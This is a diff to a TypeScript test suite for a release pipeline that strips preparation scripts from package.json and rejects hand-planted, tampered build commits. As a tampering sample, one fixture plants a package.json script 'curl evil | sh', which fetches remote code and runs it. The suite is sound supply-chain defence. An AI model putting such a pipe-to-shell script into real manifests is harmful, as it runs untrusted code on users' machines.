@@ -154,20 +154,35 @@ function stageBuild(cwd: string): void {
   git(cwd, "add", "-f", "--", "lib/index.js", "lib/pkg");
 }
 
-/** The fixture's package.json as the real one is shaped: a prepare script beside another script. */
+/** The fixture's package.json as the real one is shaped: preparation scripts (prepare, build) beside one that is not. */
 function manifestJson(version: string, scripts: Record<string, string> = FIXTURE_SCRIPTS): string {
   return `${JSON.stringify({ name: "@scope/pkg", version, scripts }, null, 2)}\n`;
 }
-const FIXTURE_SCRIPTS = { prepare: "lefthook install || true", build: "bun run build:lib" };
+const FIXTURE_SCRIPTS = {
+  prepare: "lefthook install || true",
+  build: "bun run build:lib",
+  test: "bun test",
+};
+/** FIXTURE_SCRIPTS after the pipeline's strip: the preparation scripts gone, the rest kept. */
+const STRIPPED_SCRIPTS = { test: "bun test" };
 
-/** What a chain commit's package.json looks like: the pipeline strips the prepare script when it mints one. */
+/** What a chain commit's package.json looks like: the pipeline strips the preparation scripts when it mints one. */
 function stripPrepare(cwd: string): void {
   const pkg = JSON.parse(readFileSync(join(cwd, "package.json"), "utf8")) as {
     scripts?: Record<string, string>;
   };
   delete pkg.scripts?.prepare;
+  delete pkg.scripts?.build;
   write(cwd, "package.json", `${JSON.stringify(pkg, null, 2)}\n`);
   git(cwd, "add", "package.json");
+}
+
+/** Whether planted files include the library build, which only commits minted after the prepare strip carry; a
+ * planted package.json says what the manifest is instead. */
+function carriesLibrary(files: Record<string, unknown>): boolean {
+  return (
+    Object.keys(files).some((file) => file.startsWith("lib/pkg/")) && !("package.json" in files)
+  );
 }
 
 /** What every packaged tree lacks, so a planted chain commit deviates from the pipeline's only where the test means it to. */
@@ -731,6 +746,9 @@ describe("packageRelease", () => {
       write(planter, file, content);
       git(planter, "add", "-f", file);
     }
+    if (carriesLibrary(files)) {
+      stripPrepare(planter);
+    }
     git(planter, "commit", "--quiet", "--allow-empty", ...message.flatMap((m) => ["-m", m]));
     for (const tag of tags) {
       git(planter, "tag", tag);
@@ -768,7 +786,7 @@ describe("packageRelease", () => {
       "src/marker.ts": "export const marker = 666;\n",
     });
     expect(() => packageRelease({ cwd: fx.work, tag: "v2.1.0", sourceSha: fx.mergeSha })).toThrow(
-      /is not .* plus lib\/index\.js and lib\/pkg\/, minus package\.json's prepare script, and the removal of \.github\/workflows\/ alone: .*src\/marker\.ts/,
+      /is not .* plus lib\/index\.js and lib\/pkg\/, minus package\.json's preparation scripts, and the removal of \.github\/workflows\/ alone: .*src\/marker\.ts/,
     );
   });
 
@@ -784,7 +802,7 @@ describe("packageRelease", () => {
       "kept",
     );
     expect(() => packageRelease({ cwd: fx.work, tag: "v2.1.0", sourceSha: fx.mergeSha })).toThrow(
-      /is not .* plus lib\/index\.js and lib\/pkg\/, minus package\.json's prepare script, and the removal of \.github\/workflows\/ alone: .*: \.github\/workflows\/ci\.yml \(kept\)\)/,
+      /is not .* plus lib\/index\.js and lib\/pkg\/, minus package\.json's preparation scripts, and the removal of \.github\/workflows\/ alone: .*: \.github\/workflows\/ci\.yml \(kept\)\)/,
     );
   });
 
@@ -1051,6 +1069,7 @@ describe("retagMajor", () => {
     git(planter, "config", "user.email", "planter@example.invalid");
     writeBuild(planter, "planted-wrong-bytes\n");
     stageBuild(planter);
+    stripPrepare(planter);
     git(planter, "commit", "--quiet", "-m", "build: by hand", "-m", `Source: ${fx.mergeSha}`);
     git(planter, "tag", "v2.1.0");
     git(planter, "push", "--quiet", "origin", "refs/tags/v2.1.0");
@@ -1190,6 +1209,7 @@ describe("verifyPublishedRefs", () => {
     stripWorkflows(planter);
     writeBuild(planter, "packaged-bundle-bytes-1\n");
     stageBuild(planter);
+    stripPrepare(planter);
     write(planter, "action.yml", "name: tampered\n");
     git(planter, "add", "-f", "action.yml");
     const planted = git(
@@ -1215,7 +1235,7 @@ describe("verifyPublishedRefs", () => {
     expect(() =>
       verifyPublishedRefs({ cwd: checker, tag: "v2.1.0", sourceSha: fx.mergeSha }),
     ).toThrow(
-      /is not .* plus lib\/index\.js and lib\/pkg\/, minus package\.json's prepare script, and the removal of \.github\/workflows\/ alone: .*action\.yml/,
+      /is not .* plus lib\/index\.js and lib\/pkg\/, minus package\.json's preparation scripts, and the removal of \.github\/workflows\/ alone: .*action\.yml/,
     );
   });
 
@@ -1766,6 +1786,7 @@ describe("advanceBuild", () => {
     stripWorkflows(planter);
     writeBuild(planter, "planted\n");
     stageBuild(planter);
+    stripPrepare(planter);
     for (const [file, content] of Object.entries(files)) {
       write(planter, file, content);
       git(planter, "add", "-f", file);
@@ -1936,6 +1957,9 @@ describe("advanceBuild", () => {
       }
       git(planter, "add", "-f", file);
     }
+    if (carriesLibrary(files)) {
+      stripPrepare(planter);
+    }
     const paragraphs = message.flatMap((paragraph) => ["-m", paragraph]);
     git(planter, "commit", "--quiet", "--allow-empty", ...paragraphs);
     git(planter, "push", "--quiet", "--force", "origin", "HEAD:refs/heads/build");
@@ -1981,7 +2005,7 @@ describe("advanceBuild", () => {
     const expected = rebuiltTree(fx, `rebuilt-${planted.slice(0, 8)}`, source);
     return new Error(
       `refs/heads/build ${where} ${planted}, which names ${source} as its source but is not ` +
-        `${source} plus lib/index.js and lib/pkg/, minus package.json's prepare script, and the removal of .github/workflows/ alone: its tree is ` +
+        `${source} plus lib/index.js and lib/pkg/, minus package.json's preparation scripts, and the removal of .github/workflows/ alone: its tree is ` +
         `${actual}, the rebuilt one is ${expected} (paths beyond those changed relative to ` +
         `${source}: ${changed}); ${byHand}`,
     );
@@ -1994,6 +2018,7 @@ describe("advanceBuild", () => {
     stripWorkflows(planter);
     writeBuild(planter, "planted\n");
     stageBuild(planter);
+    stripPrepare(planter);
     const emptyTree = execFileSync("git", ["hash-object", "-w", "-t", "tree", "--stdin"], {
       cwd: planter,
       input: "",
@@ -2159,7 +2184,7 @@ describe("advanceBuild", () => {
       },
     ],
     [
-      "naming this source with a package.json changed beyond its prepare script",
+      "naming this source with a package.json changed beyond its preparation scripts",
       (fx) => {
         const planted = plantBuild(
           fx,
@@ -2168,10 +2193,33 @@ describe("advanceBuild", () => {
           ["build: by hand", `Source: ${fx.mergeSha}`],
           {
             ...builtFiles("planted\n"),
-            "package.json": manifestJson("2.1.0", { build: "curl evil | sh" }),
+            "package.json": manifestJson("2.1.0", { test: "curl evil | sh" }),
           },
         );
         return { planted, error: notAPackage(fx, "holds", planted, fx.mergeSha, "package.json") };
+      },
+    ],
+    [
+      "carrying the library build beside a package.json that kept its preparation scripts",
+      (fx) => {
+        // Only bundle-only commits predate the strip; a commit with lib/pkg/ was minted after it and is held to it.
+        const planted = plantBuild(
+          fx,
+          "build-prepare-kept",
+          fx.mergeSha,
+          ["build: by hand", `Source: ${fx.mergeSha}`],
+          { ...builtFiles("planted\n"), "package.json": manifestJson("2.1.0") },
+        );
+        return {
+          planted,
+          error: notAPackage(
+            fx,
+            "holds",
+            planted,
+            fx.mergeSha,
+            "package.json (preparation scripts kept)",
+          ),
+        };
       },
     ],
     [
@@ -2198,11 +2246,11 @@ describe("advanceBuild", () => {
     expect(remoteRef(fx, "refs/tags/latest")).toBe(latestBefore);
   });
 
-  test("a chain commit's package.json is the source's without its prepare script, and a rerun holds it there", () => {
+  test("a chain commit's package.json is the source's without its preparation scripts, and a rerun holds it there", () => {
     const fx = seedFixture();
     const tip = advanceBuild({ cwd: fx.work, sourceSha: fx.mergeSha }).buildSha;
     expect(git(fx.origin, "show", `${tip}:package.json`)).toBe(
-      manifestJson("2.1.0", { build: "bun run build:lib" }).trimEnd(),
+      manifestJson("2.1.0", STRIPPED_SCRIPTS).trimEnd(),
     );
     expect(git(fx.origin, "show", `${fx.mergeSha}:package.json`)).toBe(
       manifestJson("2.1.0").trimEnd(),
